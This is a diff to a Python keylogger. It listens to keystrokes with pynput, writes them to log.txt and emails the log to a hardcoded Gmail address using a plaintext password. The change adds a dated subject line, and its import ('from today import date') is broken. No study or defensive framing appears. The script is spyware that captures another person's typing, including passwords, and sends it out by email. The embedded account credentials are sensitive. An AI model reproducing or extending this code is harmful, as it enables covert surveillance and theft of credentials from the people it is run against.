@@ -1,11 +1,14 @@
 import email , smtplib , ssl
 
+from today import date
 from email import encoders
 from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
 from pynput.keyboard import Listener	
+
+today = date.today()
 
 def anonymous (key):
 
@@ -34,12 +37,14 @@ email = "tameanhanh@gmail.com"
 pwd = "asdata448"
 address = "tameanhanh@gmail.com"
 file = "log.txt"
+subject = str(today)
 body = "file log"
 
 #tạo massage
 message = MIMEMultipart()
 message["From"] = email
 message["To"] = address
+message["Subject"] = subject
 message["Bcc"] = address  
 
 message.attach(MIMEText(body, "plain"))
